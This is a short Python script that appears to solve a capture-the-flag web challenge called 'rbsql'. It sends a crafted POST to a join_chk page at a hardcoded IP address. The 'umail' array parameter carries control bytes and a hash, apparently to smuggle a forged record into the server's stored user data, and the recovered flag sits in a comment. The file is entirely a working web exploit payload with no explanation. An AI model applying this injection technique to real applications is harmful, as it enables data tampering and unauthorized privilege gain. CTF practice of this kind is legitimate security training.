import requests

url = "http://52.78.188.150/rbsql_4f6b17dc3d565ce63ef3c4ff9eef93ad/?page=join_chk"
#url  = "http://192.168.124.139/rbSql/tmp/?page=join_chk"
data = {
	"uid" : "aaa10",
	"umail[0]" : "\x01\x209df62e693988eb4e1e1444ece0578579\x01\x01a\x01\x012",
	"umail[3]" : "bbb",
	"upw" : "ccc",
	}
r = requests.post(url, data=data)
print r.status_code
response = r.text

print response

"""
FLAG{akaneTsunemoriIsSoCuteDontYouThinkSo?}
"""
